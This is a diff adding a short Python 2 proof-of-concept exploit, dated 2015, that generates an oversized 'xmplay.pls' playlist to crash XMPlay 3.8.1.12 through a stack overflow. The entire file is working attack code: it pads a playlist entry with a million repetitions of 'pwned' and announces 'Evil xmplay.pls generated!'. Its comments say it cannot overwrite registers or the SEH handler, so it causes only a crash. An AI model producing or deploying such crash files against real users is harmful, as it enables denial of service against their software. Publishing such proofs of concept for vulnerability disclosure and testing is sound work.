@@ -1,0 +1,34 @@
+#!/usr/bin/env python
+#
+# Exploit Title: XMPlay .pls Local Crash poc
+# Date: 2015-08-16
+# Exploit Author: St0rn <st0rn[at]anbu-pentest[dot]com>
+# Twitter: st0rnpentest
+#
+# Vendor Homepage: http://www.un4seen.com/
+# Software Link:   http://www.un4seen.com/download.php?xmplay38
+# Version: 3.8.1.12
+# Tested on: Windows 7
+#
+
+
+# Stack Overflowing xmplay, but we can't 
+# rewrite any register ou SE Handler
+
+def generateCrash():
+ crash="""[playlist]
+numberofentries=1
+file1="""
+
+ crash+="pwned"*1000000
+ return crash
+
+
+
+try:
+ f=open("xmplay.pls","w")
+ f.write(generateCrash())
+ f.close
+ print "Evil xmplay.pls generated!"
+except:
+ print "I can't create file :/"
